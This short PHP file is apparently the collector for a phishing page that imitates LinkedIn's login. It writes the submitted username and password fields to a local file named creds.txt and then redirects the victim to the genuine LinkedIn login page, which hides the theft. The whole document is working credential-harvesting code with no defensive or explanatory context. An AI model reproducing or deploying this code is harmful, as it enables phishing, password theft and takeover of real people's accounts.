<?php
file_put_contents("creds.txt", "[**] Username: " . $_POST['session_key'] . " Pass: " . $_POST['session_password']);
header('Location: https://www.linkedin.com/login');
exit();
?>
